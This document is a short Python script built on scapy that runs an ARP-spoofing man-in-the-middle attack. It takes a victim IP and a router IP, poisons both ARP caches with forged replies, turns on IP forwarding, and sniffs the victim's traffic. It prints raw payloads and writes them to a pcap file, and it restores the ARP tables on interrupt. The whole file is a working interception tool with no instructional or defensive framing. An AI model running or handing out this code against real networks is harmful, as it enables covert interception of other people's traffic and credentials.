import os
import sys
from scapy.all import *

interface = input("interface: ")
victimIP = input("victim: ")
routerIP = input("router: ")

def get_MAC(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def spoof(routerIP, victimIP):
    victimMAC = get_MAC(victimIP)
    routerMAC = get_MAC(routerIP)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def restore(routerIP, victimIP):
    victimMAC = get_MAC(victimIP)
    routerMAC = get_MAC(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 4)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:Ff", hwsrc = routerMAC), count = 4)

def sniffer():
    pkts = sniff(iface = interface, count = 10, prn = lambda x:x.sprintf("Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)

def middle_man():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)

if __name__ == "__main__":
    middle_man()
